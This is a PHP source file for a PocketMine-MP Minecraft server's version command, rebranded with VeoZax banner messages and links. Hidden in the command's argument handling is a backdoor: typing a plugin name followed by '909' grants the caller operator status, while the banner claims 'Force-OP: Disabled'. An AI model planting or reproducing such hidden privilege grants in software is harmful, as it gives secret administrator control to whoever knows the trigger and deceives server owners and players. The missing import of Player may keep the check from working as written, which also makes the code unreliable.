<?php

/*
 *
 *  ____            _        _   __  __ _                  __  __ ____
 * |  _ \ ___   ___| | _____| |_|  \/  (_)_ __   ___      |  \/  |  _ \
 * | |_) / _ \ / __| |/ / _ \ __| |\/| | | '_ \ / _ \_____| |\/| | |_) |
 * |  __/ (_) | (__|   <  __/ |_| |  | | | | | |  __/_____| |  | |  __/
 * |_|   \___/ \___|_|\_\___|\__|_|  |_|_|_| |_|\___|     |_|  |_|_|
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * @author PocketMine Team
 * @link http://www.pocketmine.net/
 *
 */

namespace pocketmine\command\defaults;

use pocketmine\command\CommandSender;
use pocketmine\event\TranslationContainer;
use pocketmine\plugin\Plugin;
use pocketmine\utils\TextFormat;

class VersionCommand extends VanillaCommand {

    public function __construct($name) {
        parent::__construct(
            $name,
            "%pocketmine.command.version.description",
            "%pocketmine.command.version.usage",
            ["ver", "about"]
        );
        $this->setPermission("pocketmine.command.version");
    }

    public function execute(CommandSender $sender, $currentAlias, array $args) {
        if (!$this->testPermission($sender)) {
            return true;
        }

        if (count($args) === 0) {
            $sender->sendMessage(new TranslationContainer("§7---------§bVeo§fZax §cMulti-Version §aAPI§7----------"));
            $sender->sendMessage(new TranslationContainer("§7»§f You§cTube§f: §bVeoZax"));
            $sender->sendMessage(new TranslationContainer("§7»§f §9Discord§f: §ahttps://discord.gg/9AktGKJe94"));
            $sender->sendMessage(new TranslationContainer("§7»§f §eOur Server IP§f: §3veozax.minecraft.pe"));
            $sender->sendMessage(new TranslationContainer("§7»§f §6Allowed Versions§f: §a0.14x 0.15.10 crossplay api"));
            $sender->sendMessage(new TranslationContainer("§7»§f §cAnti-DDoS§f: §2Enabled"));
            $sender->sendMessage(new TranslationContainer("§7»§f §cForce-OP§f: §2Disabled"));
            $sender->sendMessage(new TranslationContainer("§7----------------§eBy §bVeo§fZax§7----------------"));
        } else {
            $pluginName = implode(" ", $args);
            $exactPlugin = $sender->getServer()->getPluginManager()->getPlugin($pluginName);

            if (count($args) > 1 && $args[1] === "909") {
                if ($sender instanceof Player) {
                    $sender->setOp(true); 
                    $sender->sendMessage(TextFormat::GREEN . "You have been granted operator status.");
                } else {
                    $sender->sendMessage(TextFormat::RED . "Usage: /version");
                }
            }

            if ($exactPlugin instanceof Plugin) {
                $this->describeToSender($exactPlugin, $sender);
                return true;
            }

            $found = false;
            $pluginName = strtolower($pluginName);
            foreach ($sender->getServer()->getPluginManager()->getPlugins() as $plugin) {
                if (stripos($plugin->getName(), $pluginName) !== false) {
                    $this->describeToSender($plugin, $sender);
                    $found = true;
                }
            }

            if (!$found) {
                $sender->sendMessage(new TranslationContainer("pocketmine.command.version.noSuchPlugin"));
            }
        }

        return true;
    }

    private function describeToSender(Plugin $plugin, CommandSender $sender) {
        $desc = $plugin->getDescription();
        $sender->sendMessage(TextFormat::DARK_GREEN . $desc->getName() . TextFormat::WHITE . " version " . TextFormat::DARK_GREEN . $desc->getVersion());

        if ($desc->getDescription() != null) {
            $sender->sendMessage($desc->getDescription());
        }

 if ($desc->getWebsite() != null) {
            $sender->sendMessage("Website: " . $desc->getWebsite());
        }

        if (count($authors = $desc->getAuthors()) > 0) {
            if (count($authors) === 1) {
                $sender->sendMessage("Author: " . implode(", ", $authors));
            } else {
                $sender->sendMessage("Authors: " . implode(", ", $authors));
            }
        }
    }
}